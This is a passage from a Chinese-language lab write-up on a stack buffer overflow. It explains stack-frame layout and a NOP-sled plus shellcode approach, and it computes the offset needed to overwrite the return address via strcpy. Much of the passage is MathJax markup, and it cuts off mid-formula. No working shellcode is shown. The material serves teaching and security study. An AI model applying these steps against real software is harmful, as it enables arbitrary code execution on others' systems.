<td>参数2</td>
<td>…</td>
</tr>
<tr>
<td>0x1008</td>
<td>参数1</td>
<td>[当前 ebp + 8]</td>
</tr>
<tr>
<td>0x1004</td>
<td>返回地址 RET</td>
<td>[当前 ebp + 4]</td>
</tr>
<tr>
<td>0x1000</td>
<td>原有 ebp 的值</td>
<td>[当前 ebp]</td>
</tr>
<tr>
<td>…</td>
<td>局部变量区</td>
<td>[当前 ebp - N]</td>
</tr>
</tbody>
</table>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>
<p>栈是从高地址向低地址生长的。因此，内存中栈帧的排列顺序如下：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">高地址 (High Address)</span><br><span class="line">+-----------------------------+</span><br><span class="line">|  Stack Frame for main()     |  &lt;-- 最早被压入</span><br><span class="line">+-----------------------------+</span><br><span class="line">|  Stack Frame for foo()      |</span><br><span class="line">+-----------------------------+</span><br><span class="line">|  Stack Frame for bof()      |  &lt;-- 当前正在执行，位于栈顶 (低地址端)</span><br><span class="line">+-----------------------------+</span><br><span class="line">低地址 (Low Address)</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>因此实际上运行时栈的状态为：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">地址 (高)</span><br><span class="line">  ^</span><br><span class="line">  |  [ main 的栈帧 ]</span><br><span class="line">  |  ---------------------------------------</span><br><span class="line">  |  | char str[517] (原始数组)            |</span><br><span class="line">  |  | [ &quot;AAAA....Shellcode...&quot; ]          | </span><br><span class="line">  |  | (起始地址假设为 0xBFFF9999)          |</span><br><span class="line">  |  ---------------------------------------</span><br><span class="line">  |</span><br><span class="line">  |  [ foo 的栈帧 ] (略)</span><br><span class="line">  |</span><br><span class="line">  |  [ bof 的栈帧 ]</span><br><span class="line">  |  ---------------------------------------</span><br><span class="line">  |  | 参数 str (4字节指针)                 | </span><br><span class="line">  |  | 值 = 0xBFFF9999                     | </span><br><span class="line">  |  |-------------------------------------|</span><br><span class="line">  |  | Return Address                      |</span><br><span class="line">  |  |-------------------------------------|</span><br><span class="line">  |  | Saved EBP                           |&lt;--- 当前 ebp 指向的地址</span><br><span class="line">  |  |-------------------------------------|</span><br><span class="line">  |  | buffer[199]                         |&lt;--- 局部变量区，使用ebp相对寻址</span><br><span class="line">  |  | ...                                 |</span><br><span class="line">  v</span><br><span class="line">地址 (低)</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
</ul>
<h4 id="分析">分析</h4>
<p>通过上面的复习，我们攻击的要点就是 <code>Return Address</code>，利用 <code>strcpy</code> 的漏洞，可以将我们的攻击代码注入到当前的栈帧中，步骤为：</p>
<ol>
<li>使用 <code>NOP</code> 填充 <code>str</code> 的内容。</li>
<li>将我们的 <code>shellcode</code> 复制到 <code>str[517]</code> 的末尾。</li>
<li>在 <code>str[517]</code> 中找到特殊的位置，使得 <code>strcpy</code> 后刚好能覆盖当前栈帧的 <code>Return Address</code> 。</li>
<li>将该位置的值换为 <code>buffer</code> 内部靠前的位置，这样函数调用结束后，将会跳转到 <code>NOP</code> 指令，然后滑到我们的 <code>shellcode</code>。</li>
</ol>
<p>所以我们需要计算 <code>buffer[0]</code> 和<code>Return Address</code> 之间的距离 <code>offset</code>，则 <code>str[offset]</code> 位置就是覆盖后的 <code>Return Address</code>。</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[ buffer[0] ] -&gt; ... -&gt; [ buffer[199] ] -&gt; [ 编译器填充、其他填充（位置大小） ] -&gt; [ Saved EBP (4 字节) ] -&gt; [ Return Address (4 字节) ]        </span><br></pre></td></tr></table></figure>
<p>根据上述图示我们可得：</p>

    <span id="mjx-c37e1f5">
      <style>
      #mjx-c37e1f5{
        display:contents;
        mjx-assistive-mml {
          user-select: text !important;
          clip: auto !important;
          color: rgba(0,0,0,0);
        }
        
mjx-container[jax="SVG"] {
  direction: ltr;
}

mjx-container[jax="SVG"] > svg {
  overflow: visible;
  min-height: 1px;
  min-width: 1px;
}

mjx-container[jax="SVG"] > svg a {
  fill: blue;
  stroke: blue;
}

mjx-assistive-mml {
  position: absolute !important;
  top: 0px;
  left: 0px;
  clip: rect(1px, 1px, 1px, 1px);
  padding: 1px 0px 0px 0px !important;
  border: 0px !important;
  display: block !important;
  width: auto !important;
  overflow: hidden !important;
  -webkit-touch-callout: none;
  -webkit-user-select: none;
  -khtml-user-select: none;
  -moz-user-select: none;
  -ms-user-select: none;
  user-select: none;
}

mjx-assistive-mml[display="block"] {
  width: 100% !important;
}

mjx-container[jax="SVG"][display="true"] {
  display: block;
  text-align: center;
  margin: 1em 0;
}

mjx-container[jax="SVG"][display="true"][width="full"] {
  display: flex;
}

mjx-container[jax="SVG"][justify="left"] {
  text-align: left;
}

mjx-container[jax="SVG"][justify="right"] {
  text-align: right;
}

g[data-mml-node="merror"] > g {
  fill: red;
  stroke: red;
}

g[data-mml-node="merror"] > rect[data-background] {
  fill: yellow;
  stroke: none;
}

g[data-mml-node="mtable"] > line[data-line], svg[data-table] > g > line[data-line] {
  stroke-width: 70px;
  fill: none;
}

g[data-mml-node="mtable"] > rect[data-frame], svg[data-table] > g > rect[data-frame] {
  stroke-width: 70px;
  fill: none;
}

g[data-mml-node="mtable"] > .mjx-dashed, svg[data-table] > g > .mjx-dashed {
  stroke-dasharray: 140;
}

g[data-mml-node="mtable"] > .mjx-dotted, svg[data-table] > g > .mjx-dotted {
  stroke-linecap: round;
  stroke-dasharray: 0,140;
}

g[data-mml-node="mtable"] > g > svg {
  overflow: visible;
}

[jax="SVG"] mjx-tool {
  display: inline-block;
  position: relative;
  width: 0;
  height: 0;
}

[jax="SVG"] mjx-tool > mjx-tip {
  position: absolute;
  top: 0;
  left: 0;
}

mjx-tool > mjx-tip {
  display: inline-block;
  padding: .2em;
  border: 1px solid #888;
  font-size: 70%;
  background-color: #F8F8F8;
  color: black;
  box-shadow: 2px 2px 5px #AAAAAA;
}

g[data-mml-node="maction"][data-toggle] {
  cursor: pointer;
}

mjx-status {
  display: block;
  position: fixed;
  left: 1em;
  bottom: 1em;
  min-width: 25%;
  padding: .2em .4em;
  border: 1px solid #888;
  font-size: 90%;
  background-color: #F8F8F8;
  color: black;
}

foreignObject[data-mjx-xml] {
  font-family: initial;
  line-height: normal;
  overflow: visible;
}

mjx-container[jax="SVG"] path[data-c], mjx-container[jax="SVG"] use[data-c] {
  stroke-width: 3;
}

g[data-mml-node="xypic"] path {
  stroke-width: inherit;
}

.MathJax g[data-mml-node="xypic"] path {
  stroke-width: inherit;
}

      }
      </style>
      <mjx-container class="MathJax" jax="SVG" display="true" style="position: relative;"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="40.424ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 17867.4 1000" aria-hidden="true"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="TeXAtom" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="6F" d="M28 214Q28 309 93 378T250 448Q340 448 405 380T471 215Q471 120 407 55T250 -10Q153 -10 91 57T28 214ZM250 30Q372 30 372 193V225V250Q372 272 371 288T364 326T348 362T317 390T268 410Q263 411 252 411Q222 411 195 399Q152 377 139 338T126 246V226Q126 130 145 91Q177 30 250 30Z"></path><path data-c="66" d="M273 0Q255 3 146 3Q43 3 34 0H26V46H42Q70 46 91 49Q99 52 103 60Q104 62 104 224V385H33V431H104V497L105 564L107 574Q126 639 171 668T266 704Q267 704 275 704T289 705Q330 702 351 679T372 627Q372 604 358 590T321 576T284 590T270 627Q270 647 288 667H284Q280 668 273 668Q245 668 223 647T189 592Q183 572 182 497V431H293V385H185V225Q185 63 186 61T189 57T194 54T199 51T206 49T213 48T222 47T231 47T241 46T251 46H282V0H273Z" transform="translate(500,0)"></path><path data-c="66" d="M273 0Q255 3 146 3Q43 3 34 0H26V46H42Q70 46 91 49Q99 52 103 60Q104 62 104 224V385H33V431H104V497L105 564L107 574Q126 639 171 668T266 704Q267 704 275 704T289 705Q330 702 351 679T372 627Q372 604 358 590T321 576T284 590T270 627Q270 647 288 667H284Q280 668 273 668Q245 668 223 647T189 592Q183 572 182 497V431H293V385H185V225Q185 63 186 61T189 57T194 54T199 51T206 49T213 48T222 47T231 47T241 46T251 46H282V0H273Z" transform="translate(806,0)"></path><path data-c="73" d="M295 316Q295 356 268 385T190 414Q154 414 128 401Q98 382 98 349Q97 344 98 336T114 312T157 287Q175 282 201 278T245 269T277 256Q294 248 310 236T342 195T359 133Q359 71 321 31T198 -10H190Q138 -10 94 26L86 19L77 10Q71 4 65 -1L54 -11H46H42Q39 -11 33 -5V74V132Q33 153 35 157T45 162H54Q66 162 70 158T75 146T82 119T101 77Q136 26 198 26Q295 26 295 104Q295 133 277 151Q257 175 194 187T111 210Q75 227 54 256T33 318Q33 357 50 384T93 424T143 442T187 447H198Q238 447 268 432L283 424L292 431Q302 440 314 448H322H326Q329 448 335 442V310L329 304H301Q295 310 295 316Z" transform="translate(1112,0)"></path><path data-c="65" d="M28 218Q28 273 48 318T98 391T163 433T229 448Q282 448 320 430T378 380T406 316T415 245Q415 238 408 231H126V216Q126 68 226 36Q246 30 270 30Q312 30 342 62Q359 79 369 104L379 128Q382 131 395 131H398Q415 131 415 121Q415 117 412 108Q393 53 349 21T250 -11Q155 -11 92 58T28 218ZM333 275Q322 403 238 411H236Q228 411 220 410T195 402T166 381T143 340T127 274V267H333V275Z" transform="translate(1506,0)"></path><path data-c="74" d="M27 422Q80 426 109 478T141 600V615H181V431H316V385H181V241Q182 116 182 100T189 68Q203 29 238 29Q282 29 292 100Q293 108 293 146V181H333V146V134Q333 57 291 17Q264 -10 221 -10Q187 -10 162 2T124 33T105 68T98 100Q97 107 97 248V385H18V422H27Z" transform="translate(1950,0)"></path></g></g><g data-mml-node="mo" transform="translate(2616.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mo" transform="translate(3672.6,0)"><path data-c="5B" d="M118 -250V750H255V710H158V-210H255V-250H118Z"></path></g><g data-mml-node="TeXAtom" data-mjx-texclass="ORD" transform="translate(3950.6,0)"><g data-mml-node="mi"><path data-c="41" d="M255 0Q240 3 140 3Q48 3 39 0H32V46H47Q119 49 139 88Q140 91 192 245T295 553T348 708Q351 716 366 716H376Q396 715 400 709Q402 707 508 390L617 67Q624 54 636 51T687 46H717V0H708Q699 3 581 3Q458 3 437 0H427V46H440Q510 46 510 64Q510 66 486 138L462 209H229L209 150Q189 91 189 85Q189 72 209 59T259 46H264V0H255ZM447 255L345 557L244 256Q244 255 345 255H447Z"></path><path data-c="64" d="M376 495Q376 511 376 535T377 568Q377 613 367 624T316 637H298V660Q298 683 300 683L310 684Q320 685 339 686T376 688Q393 689 413 690T443 693T454 694H457V390Q457 84 458 81Q461 61 472 55T517 46H535V0Q533 0 459 -5T380 -11H373V44L365 37Q307 -11 235 -11Q158 -11 96 50T34 215Q34 315 97 378T244 442Q319 442 376 393V495ZM373 342Q328 405 260 405Q211 405 173 369Q146 341 139 305T131 211Q131 155 138 120T173 59Q203 26 251 26Q322 26 373 103V342Z" transform="translate(750,0)"></path><path data-c="64" d="M376 495Q376 511 376 535T377 568Q377 613 367 624T316 637H298V660Q298 683 300 683L310 684Q320 685 339 686T376 688Q393 689 413 690T443 693T454 694H457V390Q457 84 458 81Q461 61 472 55T517 46H535V0Q533 0 459 -5T380 -11H373V44L365 37Q307 -11 235 -11Q158 -11 96 50T34 215Q34 315 97 378T244 442Q319 442 376 393V495ZM373 342Q328 405 260 405Q211 405 173 369Q146 341 139 305T131 211Q131 155 138 120T173 59Q203 26 251 26Q322 26 373 103V342Z" transform="translate(1306,0)"></path><path data-c="72" d="M36 46H50Q89 46 97 60V68Q97 77 97 91T98 122T98 161T98 203Q98 234 98 269T98 328L97 351Q94 370 83 376T38 385H20V408Q20 431 22 431L32 432Q42 433 60 434T96 436Q112 437 131 438T160 441T171 442H174V373Q213 441 271 441H277Q322 441 343 419T364 373Q364 352 351 337T313 322Q288 322 276 338T263 372Q263 381 265 388T270 400T273 405Q271 407 250 401Q234 393 226 386Q179 341 179 207V154Q179 141 179 127T179 101T180 81T180 66V61Q181 59 183 57T188 54T193 51T200 49T207 48T216 47T225 47T235 46T245 46H276V0H267Q249 3 140 3Q37 3 28 0H20V46H36Z" transform="translate(1862,0)"></path></g><g data-mml-node="mo" transform="translate(2254,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(2643,0)"><path data-c="45" d="M128 619Q121 626 117 628T101 631T58 634H25V680H597V676Q599 670 611 560T625 444V440H585V444Q584 447 582 465Q578 500 570 526T553 571T528 601T498 619T457 629T411 633T353 634Q266 634 251 633T233 622Q233 622 233 621Q232 619 232 497V376H286Q359 378 377 385Q413 401 416 469Q416 471 416 473V493H456V213H416V233Q415 268 408 288T383 317T349 328T297 330Q290 330 286 330H232V196V114Q232 57 237 52Q243 47 289 47H340H391Q428 47 452 50T505 62T552 92T584 146Q594 172 599 200T607 247T612 270V273H652V270Q651 267 632 137T610 3V0H25V46H58Q100 47 109 49T128 61V619Z"></path><path data-c="42" d="M131 622Q124 629 120 631T104 634T61 637H28V683H229H267H346Q423 683 459 678T531 651Q574 627 599 590T624 512Q624 461 583 419T476 360L466 357Q539 348 595 302T651 187Q651 119 600 67T469 3Q456 1 242 0H28V46H61Q103 47 112 49T131 61V622ZM511 513Q511 560 485 594T416 636Q415 636 403 636T371 636T333 637Q266 637 251 636T232 628Q229 624 229 499V374H312L396 375L406 377Q410 378 417 380T442 393T474 417T499 456T511 513ZM537 188Q537 239 509 282T430 336L329 337H229V200V116Q229 57 234 52Q240 47 334 47H383Q425 47 443 53Q486 67 511 104T537 188Z" transform="translate(681,0)"></path><path data-c="50" d="M130 622Q123 629 119 631T103 634T60 637H27V683H214Q237 683 276 683T331 684Q419 684 471 671T567 616Q624 563 624 489Q624 421 573 372T451 307Q429 302 328 301H234V181Q234 62 237 58Q245 47 304 46H337V0H326Q305 3 182 3Q47 3 38 0H27V46H60Q102 47 111 49T130 61V622ZM507 488Q507 514 506 528T500 564T483 597T450 620T397 635Q385 637 307 637H286Q237 637 234 628Q231 624 231 483V342H302H339Q390 342 423 349T481 382Q507 411 507 488Z" transform="translate(1389,0)"></path></g><g data-mml-node="mo" transform="translate(4713,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(5324.2,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="mi" transform="translate(6324.4,0)"><path data-c="41" d="M255 0Q240 3 140 3Q48 3 39 0H32V46H47Q119 49 139 88Q140 91 192 245T295 553T348 708Q351 716 366 716H376Q396 715 400 709Q402 707 508 390L617 67Q624 54 636 51T687 46H717V0H708Q699 3 581 3Q458 3 437 0H427V46H440Q510 46 510 64Q510 66 486 138L462 209H229L209 150Q189 91 189 85Q189 72 209 59T259 46H264V0H255ZM447 255L345 557L244 256Q244 255 345 255H447Z"></path><path data-c="64" d="M376 495Q376 511 376 535T377 568Q377 613 367 624T316 637H298V660Q298 683 300 683L310 684Q320 685 339 686T376 688Q393 689 413 690T443 693T454 694H457V390Q457 84 458 81Q461 61 472 55T517 46H535V0Q533 0 459 -5T380 -11H373V44L365 37Q307 -11 235 -11Q158 -11 96 50T34 215Q34 315 97 378T244 442Q319 442 376 393V495ZM373 342Q328 405 260 405Q211 405 173 369Q146 341 139 305T131 211Q131 155 138 120T173 59Q203 26 251 26Q322 26 373 103V342Z" transform="translate(750,0)"></path><path data-c="64" d="M376 495Q376 511 376 535T377 568Q377 613 367 624T316 637H298V660Q298 683 300 683L310 684Q320 685 339 686T376 688Q393 689 413 690T443 693T454 694H457V390Q457 84 458 81Q461 61 472 55T517 46H535V0Q533 0 459 -5T380 -11H373V44L365 37Q307 -11 235 -11Q158 -11 96 50T34 215Q34 315 97 378T244 442Q319 442 376 393V495ZM373 342Q328 405 260 405Q211 405 173 369Q146 341 139 305T131 211Q131 155 138 120T173 59Q203 26 251 26Q322 26 373 103V342Z" transform="translate(1306,0)"></path><path data-c="72" d="M36 46H50Q89 46 97 60V68Q97 77 97 91T98 122T98 161T98 203Q98 234 98 269T98 328L97 351Q94 370 83 376T38 385H20V408Q20 431 22 431L32 432Q42 433 60 434T96 436Q112 437 131 438T160 441T171 442H174V373Q213 441 271 441H277Q322 441 343 419T364 373Q364 352 351 337T313 322Q288 322 276 338T263 372Q263 381 265 388T270 400T273 405Q271 407 250 401Q234 393 226 386Q179 341 179 207V154Q179 141 179 127T179 101T180 81T180 66V61Q181 59 183 57T188 54T193 51T200 49T207 48T216 47T225 47T235 46T245 46H276V0H267Q249 3 140 3Q37 3 28 0H20V46H36Z" transform="translate(1862,0)"></path></g><g data-mml-node="mo" transform="translate(8578.4,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(8967.4,0)"><path data-c="62" d="M307 -11Q234 -11 168 55L158 37Q156 34 153 28T147 17T143 10L138 1L118 0H98V298Q98 599 97 603Q94 622 83 628T38 637H20V660Q20 683 22 683L32 684Q42 685 61 686T98 688Q115 689 135 690T165 693T176 694H179V543Q179 391 180 391L183 394Q186 397 192 401T207 411T228 421T254 431T286 439T323 442Q401 442 461 379T522 216Q522 115 458 52T307 -11ZM182 98Q182 97 187 90T196 79T206 67T218 55T233 44T250 35T271 29T295 26Q330 26 363 46T412 113Q424 148 424 212Q424 287 412 323Q385 405 300 405Q270 405 239 390T188 347L182 339V98Z"></path><path data-c="75" d="M383 58Q327 -10 256 -10H249Q124 -10 105 89Q104 96 103 226Q102 335 102 348T96 369Q86 385 36 385H25V408Q25 431 27 431L38 432Q48 433 67 434T105 436Q122 437 142 438T172 441T184 442H187V261Q188 77 190 64Q193 49 204 40Q224 26 264 26Q290 26 311 35T343 58T363 90T375 120T379 144Q379 145 379 161T380 201T380 248V315Q380 361 370 372T320 385H302V431Q304 431 378 436T457 442H464V264Q464 84 465 81Q468 61 479 55T524 46H542V0Q540 0 467 -5T390 -11H383V58Z" transform="translate(556,0)"></path><path data-c="66" d="M273 0Q255 3 146 3Q43 3 34 0H26V46H42Q70 46 91 49Q99 52 103 60Q104 62 104 224V385H33V431H104V497L105 564L107 574Q126 639 171 668T266 704Q267 704 275 704T289 705Q330 702 351 679T372 627Q372 604 358 590T321 576T284 590T270 627Q270 647 288 667H284Q280 668 273 668Q245 668 223 647T189 592Q183 572 182 497V431H293V385H185V225Q185 63 186 61T189 57T194 54T199 51T206 49T213 48T222 47T231 47T241 46T251 46H282V0H273Z" transform="translate(1112,0)"></path><path data-c="66" d="M273 0Q255 3 146 3Q43 3 34 0H26V46H42Q70 46 91 49Q99 52 103 60Q104 62 104 224V385H33V431H104V497L105 564L107 574Q126 639 171 668T266 704Q267 704 275 704T289 705Q330 702 351 679T372 627Q372 604 358 590T321 576T284 590T270 627Q270 647 288 667H284Q280 668 273 668Q245 668 223 647T189 592Q183 572 182 497V431H293V385H185V225Q185 63 186 61T189 57T194 54T199 51T206 49T213 48T222 47T231 47T241 46T251 46H282V0H273Z" transform="translate(1418,0)"></path><path data-c="65" d="M28 218Q28 273 48 318T98 391T163 433T229 448Q282 448 320 430T378 380T406 316T415 245Q415 238 408 231H126V216Q126 68 226 36Q246 30 270 30Q312 30 342 62Q359 79 369 104L379 128Q382 131 395 131H398Q415 131 415 121Q415 117 412 108Q393 53 349 21T250 -11Q155 -11 92 58T28 218ZM333 275Q322 403 238 411H236Q228 411 220 410T195 402T166 381T143 340T127 274V267H333V275Z" transform="translate(1724,0)"></path><path data-c="72" d="M36 46H50Q89 46 97 60V68Q97 77 97 91T98 122T98 161T98 203Q98 234 98 269T98 328L97 351Q94 370 83 376T38 385H20V408Q20 431 22 431L32 432Q42 433 60 434T96 436Q112 437 131 438T160 441T171 442H174V373Q213 441 271 441H277Q322 441 343 419T364 373Q364 352 351 337T313 322Q288 322 276 338T263 372Q263 381 265 388T270 400T273 405Q271 407 250 401Q234 393 226 386Q179 341 179 207V154Q179 141 179 127T179 101T180 81T180 66V61Q181 59 183 57T188 54T193 51T200 49T207 48T216 47T225 47T235 46T245 46H276V0H267Q249 3 140 3Q37 3 28 0H20V46H36Z" transform="translate(2168,0)"></path></g><g data-mml-node="mo" transform="translate(11527.4,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g><g data-mml-node="mo" transform="translate(15867,0)"><path data-c="5D" d="M22 710V750H159V-250H22V-210H119V710H22Z"></path></g><g data-mml-node="mo" transform="translate(16367.2,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="mn" transform="translate(17367.4,0)"><path data-c="34" d="M462 0Q444 3 333 3Q217 3 199 0H190V46H221Q241 46 248 46T265 48T279 53T286 61Q287 63 287 115V165H28V211L179 442Q332 674 334 675Q336 677 355 677H373L379 671V211H471V165H379V114Q379 73 379 66T385 54Q393 47 442 46H471V0H462ZM293 211V545L74 212L183 211H293Z"></path></g></g></g></svg><mjx-assistive-mml unselectable="on" display="block"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><mrow data-mjx-texclass="ORD"><mi data-mjx-auto-op="false">offset</mi></mrow><mo>=</mo><mo stretchy="false">[</mo><mrow data-mjx-texclass="ORD"><mi data-mjx-auto-op="false">Addr</mi><mo stretchy="false">(</mo><mi data-mjx-auto-op="false">EBP</mi><mo stretchy="false">)</mo><mo>−</mo><mi data-mjx-auto-op="false">Addr</mi><mo stretchy="false">(</mo><mi data-mjx-auto-op="false">buffer</mi><mo stretchy="false">)</mo></mrow><mo stretchy="false">]</mo><mo>+</mo><mn>4</mn></math></mjx-assistive-mml></mjx-container>
    </span>
  <p>我们当前的内存分布为：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">低地址</span><br><span class="line">str[0]		|  NOP</span><br><span class="line">			|  NOP ...</span><br><span class="line">            |  ------------------</span><br><span class="line">str[offset]	|  准备修改的 Return Address </span><br><span class="line">			|  ------------------</span><br><span class="line">			|  NOP ...</span><br><span class="line">			|  Shellcode</span><br><span class="line">高地址</span><br></pre></td></tr></table></figure>
<p>只要我们将跳转位置设置为原本 <code>Return Address</code> 位置后面的任意 NOP 的地址，最终都能到达我们的 <code>shellcode</code> ，因此我们有：</p>

    <span id="mjx-fbd9173">
      <style>
      #mjx-fbd9173{
        display:contents;
        mjx-assistive-mml {
          user-select: text !important;
          clip: auto !important;
          color: rgba(0,0,0,0);
        }
        
mjx-container[jax="SVG"] {
  direction: ltr;
}

mjx-container[jax="SVG"] > svg {
  overflow: visible;
  min-height: 1px;
  min-width: 1px;
}

mjx-container[jax="SVG"] > svg a {
  fill: blue;
  stroke: blue;
}

mjx-assistive-mml {
  position: absolute !important;
  top: 0px;
  left: 0px;
  clip: rect(1px, 1px, 1px, 1px);
  padding: 1px 0px 0px 0px !important;
  border: 0px !important;
  display: block !important;
  width: auto !important;
  overflow: hidden !important;
  -webkit-touch-callout: none;
  -webkit-user-select: none;
  -khtml-user-select: none;
  -moz-user-select: none;
  -ms-user-select: none;
  user-select: none;
}

mjx-assistive-mml[display="block"] {
  width: 100% !important;
}

mjx-container[jax="SVG"][display="true"] {
  display: block;
  text-align: center;
  margin: 1em 0;
}

mjx-container[jax="SVG"][display="true"][width="full"] {
  display: flex;
}

mjx-container[jax="SVG"][justify="left"] {
  text-align: left;
}

mjx-container[jax="SVG"][justify="right"] {
  text-align: right;
}

g[data-mml-node="merror"] > g {
  fill: red;
  stroke: red;
}

g[data-mml-node="merror"] > rect[data-background] {
  fill: yellow;
  stroke: none;
}

g[data-mml-node="mtable"] > line[data-line], svg[data-table] > g > line[data-line] {
  stroke-width: 70px;
  fill: none;
}

g[data-mml-node="mtable"] > rect[data-frame], svg[data-table] > g > rect[data-frame] {
  stroke-width: 70px;
  fill: none;
}

g[data-mml-node="mtable"] > .mjx-dashed, svg[data-table] > g > .mjx-dashed {
  stroke-dasharray: 140;
}

g[data-mml-node="mtable"] > .mjx-dotted, svg[data-table] > g > .mjx-dotted {
  stroke-linecap: round;
  stroke-dasharray: 0,140;
}

g[data-mml-node="mtable"] > g > svg {
  overflow: visible;
}

[jax="SVG"] mjx-tool {
  display: inline-block;
  position: relative;
  width: 0;
  height: 0;
}

[jax="SVG"] mjx-tool > mjx-tip {
  position: absolute;
  top: 0;
  left: 0;
}

mjx-tool > mjx-tip {
  display: inline-block;
  padding: .2em;
  border: 1px solid #888;
  font-size: 70%;
  background-color: #F8F8F8;
  color: black;
  box-shadow: 2px 2px 5px #AAAAAA;
}

g[data-mml-node="maction"][data-toggle] {
  cursor: pointer;
}

mjx-status {
  display: block;
  position: fixed;
  left: 1em;
  bottom: 1em;
  min-width: 25%;
  padding: .2em .4em;
  border: 1px solid #888;
  font-size: 90%;
  background-color: #F8F8F8;
  color: black;
}

foreignObject[data-mjx-xml] {
  font-family: initial;
  line-height: normal;
  overflow: visible;
}

mjx-container[jax="SVG"] path[data-c], mjx-container[jax="SVG"] use[data-c] {
  stroke-width: 3;
}

g[data-mml-node="xypic"] path {
  stroke-width: inherit;
}

.MathJax g[data-mml-node="xypic"] path {
  stroke-width: inherit;
}

      }
      </style>
      <mjx-container class="MathJax" jax="SVG" display="true" style="position: relative;"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="59.251ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 26189 1000" aria-hidden="true"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="TeXAtom" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="72" d="M36 46H50Q89 46 97 60V68Q97 77 97 91T98 122T98 161T98 203Q98 234 98 269T98 328L97 351Q94 370 83 376T38 385H20V408Q20 431 22 431L32 432Q42 433 60 434T96 436Q112 437 131 438T160 441T171 442H174V373Q213 441 271 441H277Q322 441 343 419T364 373Q364 352 351 337T313 322Q288 322 276 338T263 372Q263 381 265 388T270 400T273 405Q271 407 250 401Q234 393 226 386Q179 341 179 207V154Q179 141 179 127T179 101T180 81T180 66V61Q181 59 183 57T188 54T193 51T200 49T207 48T216 47T225 47T235 46T245 46H276V0H267Q249 3 140 3Q37 3 28 0H20V46H36Z"></path><path data-c="65" d="M28 218Q28 273 48 318T98 391T163 433T229 448Q282 448 320 430T378 380T406 316T415 245Q415 238 408 231H126V216Q126 68 226 36Q246 30 270 30Q312 30 342 62Q359 79 369 104L379 128Q382 131 395 131H398Q415 131 415 121Q415 117 412 108Q393 53 349 21T250 -11Q155 -11 92 58T28 218ZM333 275Q322 403 238 411H236Q228 411 220 410T195 402T166 381T143 340T127 274V267H333V275Z" transform="translate(392,0)"></path><path data-c="74" d="M27 422Q80 426 109 478T141 600V615H181V431H316V385H181V241Q182 116 182 100T189 68Q203 29 238 29Q282 29 292 100Q293 108 293 146V181H333V146V134Q333 57 291 17Q264 -10 221 -10Q187 -10 162 2T124 33T105 68T98 100Q97 107 97 248V385H18V422H27Z" transform="translate(836,0)"></path></g></g><g data-mml-node="mo" transform="translate(1502.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 